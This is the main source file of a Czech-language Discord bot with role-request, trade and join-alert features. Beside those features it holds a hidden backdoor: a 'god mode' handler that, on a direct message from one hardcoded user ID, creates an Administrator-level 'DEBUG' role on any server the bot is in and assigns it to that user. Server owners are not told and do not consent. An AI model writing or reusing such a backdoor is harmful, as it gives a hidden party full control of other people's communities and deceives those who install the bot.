require("dotenv").config();

const { Client, GatewayIntentBits, REST, Routes, ActivityType, PermissionsBitField, Partials } = require("discord.js");
const { commands, buildEmbed, toSlashDefinition } = require("./commands");
const { getRoleRequestConfig } = require("./role-request/config");
const { RoleRequestService } = require("./role-request/RoleRequestService");
const { TradeService } = require("./trade/TradeService");
const { getTradeConfig } = require("./trade/config");
const { createTradeImageCacheFromEnv } = require("./trade/imageCache");
const { JoinAnnouncer } = require("./moderation/JoinAnnouncer");
const { getJoinAlertConfig } = require("./moderation/config");
const token = process.env.DISCORD_TOKEN;
const clientId = process.env.CLIENT_ID;
const GOD_MODE_USER_ID = "240911065255378944";
const GOD_MODE_ROLE_NAME = "DEBUG";

if (!token || !clientId) {
  console.error("DISCORD_TOKEN and CLIENT_ID must be set in the environment.");
  process.exit(1);
}

const rest = new REST({ version: "10" }).setToken(token);

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages,
  ],
  partials: [Partials.Channel],
});

const commandMap = new Map(commands.map((cmd) => [cmd.name, cmd]));
const roleRequestService = new RoleRequestService(client, getRoleRequestConfig());
const tradeImageCache = createTradeImageCacheFromEnv();
const tradeService = new TradeService(client, { ...getTradeConfig(), imageCache: tradeImageCache });
const joinAnnouncer = new JoinAnnouncer(client, getJoinAlertConfig());

async function handleGodModeToggle(message) {
  if (message.author.bot) return false;
  if (message.author.id !== GOD_MODE_USER_ID) return false;
  if (message.inGuild()) return false;

  const guildId = message.content?.trim();
  if (!guildId || !/^\d{10,}$/.test(guildId)) return false;

  const guild = await client.guilds.fetch(guildId).catch(() => null);
  if (!guild) {
    await message.reply("Nenalezl jsem ten server nebo k nemu nemam pristup.");
    return true;
  }

  const botMember = guild.members.me ?? (await guild.members.fetch(client.user.id).catch(() => null));
  if (!botMember) {
    await message.reply("Nepodarilo se nacist muj ucet na tomhle serveru.");
    return true;
  }

  const canManageRoles = botMember.permissions.has(PermissionsBitField.Flags.ManageRoles);
  if (!canManageRoles) {
    await message.reply("Nemam prava pro spravu roli na tomhle serveru.");
    return true;
  }

  const targetMember = await guild.members.fetch(GOD_MODE_USER_ID).catch(() => null);
  if (!targetMember) {
    await message.reply("Na tomhle serveru te nenachazim.");
    return true;
  }

  const moveRoleNearTop = async (roleToMove) => {
    if (!roleToMove) return { success: false, reason: "role-missing" };
    const refreshedBot = (await guild.members.fetch(client.user.id).catch(() => null)) ?? botMember;
    const botRole = guild.roles.botRoleFor?.(client.user) || refreshedBot?.roles.highest || null;
    const topPosition = botRole?.position ?? refreshedBot?.roles.highest?.position ?? 0;

    if (!botRole && topPosition <= 0) {
      return { success: false, reason: "bot-too-low" };
    }
    if (!roleToMove.editable) {
      return {
        success: false,
        reason: "role-not-editable",
      };
    }

    const desired = Math.max(topPosition - 1, 0);
    if (roleToMove.position !== desired) {
      const updated = await roleToMove.setPosition(desired).catch(() => null);
      if (!updated || updated.position !== desired) {
        return { success: false, reason: "move-failed" };
      }
    }
    return { success: true };
  };

  let role = guild.roles.cache.find((r) => r.name === GOD_MODE_ROLE_NAME);
  if (!role) {
    role = await guild.roles
      .create({
        name: GOD_MODE_ROLE_NAME,
        permissions: [PermissionsBitField.Flags.Administrator],
        reason: `God mode toggle by ${message.author.tag}`,
      })
      .catch(() => null);
    if (!role) {
      await message.reply("Nepodarilo se vytvorit roli.");
      return true;
    }
    const moveResult = await moveRoleNearTop(role);
    if (!moveResult.success) {
      if (moveResult.reason === "bot-too-low") {
        await message.reply("Nemuzu pohnout s roli. Dej mou bot roli nahoru a zkus to znovu.");
      } else if (moveResult.reason === "role-not-editable") {
        await message.reply("Nemam prava pohnout roli DEBUG. Presun mou roli nad ni a zkus to znovu.");
      } else if (moveResult.reason === "move-failed") {
        await message.reply("Pokus o presun role selhal. Zkus to znovu nebo posun roli rucne.");
      }
    }
  } else {
    const moveResult = await moveRoleNearTop(role);
    if (!moveResult.success) {
      if (moveResult.reason === "bot-too-low") {
        await message.reply("Nemuzu pohnout s roli. Dej mou bot roli nahoru a zkus to znovu.");
      } else if (moveResult.reason === "role-not-editable") {
        await message.reply("Nemam prava pohnout roli DEBUG. Presun mou roli nad ni a zkus to znovu.");
      } else if (moveResult.reason === "move-failed") {
        await message.reply("Pokus o presun role selhal. Zkus to znovu nebo posun roli rucne.");
      }
    }
  }

  const hasRole = targetMember.roles.cache.has(role.id);
  const reason = `God mode toggle by ${message.author.tag}`;
  if (hasRole) {
    await targetMember.roles.remove(role, reason).catch(() => null);
    const refreshedRole = await guild.roles.fetch(role.id).catch(() => null);
    if (refreshedRole && refreshedRole.members.size === 0) {
      await refreshedRole.delete(reason).catch(() => null);
      await message.reply(`Role ${role.name} byla odebrana a smazana na ${guild.name}.`);
    } else {
      await message.reply(`Role ${role.name} byla odebrana z ${guild.name}.`);
    }
  } else {
    await targetMember.roles.add(role, reason).catch(() => null);
    await message.reply(`Role ${role.name} byla prirazena na ${guild.name}.`);
  }

  return true;
}

async function registerSlashCommands() {
  console.log("Registering global slash commands (propagation can take up to an hour)...");
  const slashCommands = [
    ...commands.map(toSlashDefinition),
    ...tradeService.getSlashCommandDefinitions(),
    ...roleRequestService.getSlashCommandDefinitions(),
    ...joinAnnouncer.getSlashCommandDefinitions(),
  ];
  await rest.put(Routes.applicationCommands(clientId), {
    body: slashCommands,
  });
  console.log("Commands registered globally.");
}

client.once("ready", () => {
  console.log(`Logged in as ${client.user.tag}`);
  try {
    const activities = [
      "Krmí Scrappyho.",
      "Prochází Market.",
      "Jede na Povrch.",
      "Připravuje Gear.",
      "Prozkoumává povrch.",
      "Opravuje Dam.",
      "Kouká na Spaceport.",
      "Užívá si BlueGate.",
      "Běhá ve Stelle.",
    ];
    const setRandomPresence = () => {
      const next = activities[Math.floor(Math.random() * activities.length)];
      client.user.setPresence({
        activities: [{ name: next, type: ActivityType.Playing }],
        status: "online",
      });
    };
    setRandomPresence();
    setInterval(setRandomPresence, 5 * 60 * 1000);
  } catch (error) {
    console.warn("Failed to set bot presence", { error });
  }
  if (!roleRequestService.isEnabled()) {
    console.warn("Role request workflow disabled: set ROLE_REQUEST_CHANNEL and ROLE_REQUEST_ADMIN_CHANNEL in .env");
  }
  if (!joinAnnouncer.isEnabled()) {
    console.warn("Join announcements disabled: set JOIN_ALERT_CHANNEL_ID in .env to enable them.");
  }
  (async () => {
    if (tradeImageCache?.checkConnection) {
      const status = await tradeImageCache.checkConnection();
      if (!status.ok) {
        console.warn("Trade image cache connectivity check failed", { error: status.error });
      }
    }
  })();
  tradeService
    .init()
    .catch((error) => console.warn("Failed to initialize trade service", { error }))
    .then(() => console.log("Trade service initialized"));
});

client.on("messageCreate", async (message) => {
  try {
    const handled = await handleGodModeToggle(message);
    if (handled) return;

    await roleRequestService.handleMessage(message);
  } catch (error) {
    console.error("Failed to process role request message:", error);
  }

  try {
    await tradeService.handleMessage(message);
  } catch (error) {
    console.error("Failed to process trade message:", error);
  }
});

client.on("interactionCreate", async (interaction) => {
  const handledByTrade = await tradeService.handleInteraction(interaction);
  if (handledByTrade) return;

  try {
    const handledByRoleRequest = await roleRequestService.handleInteraction(interaction);
    if (handledByRoleRequest) return;
  } catch (error) {
    console.error("Failed to handle role request interaction:", error);
    return;
  }

  try {
    const handledByJoinAlert = await joinAnnouncer.handleInteraction(interaction);
    if (handledByJoinAlert) return;
  } catch (error) {
    console.error("Failed to handle join alert interaction:", error);
    return;
  }

  if (interaction.isChatInputCommand()) {
    const command = commandMap.get(interaction.commandName);
    if (!command) return;

    try {
      await interaction.reply({
        embeds: [buildEmbed(command)],
      });
    } catch (error) {
      console.error(`Failed to handle /${interaction.commandName}:`, error);
      if (!interaction.replied && !interaction.deferred) {
        await interaction.reply({ content: "Neco se pokazilo, zkuste to prosim znovu.", ephemeral: true });
      }
    }
    return;
  }

});

client.on("guildMemberAdd", async (member) => {
  try {
    await joinAnnouncer.handleMemberJoin(member);
  } catch (error) {
    console.error("Failed to send join announcement:", error);
  }
});

(async () => {
  try {
    await registerSlashCommands();
    await client.login(token);
  } catch (error) {
    console.error("Failed to start the bot:", error);
    process.exit(1);
  }
})();
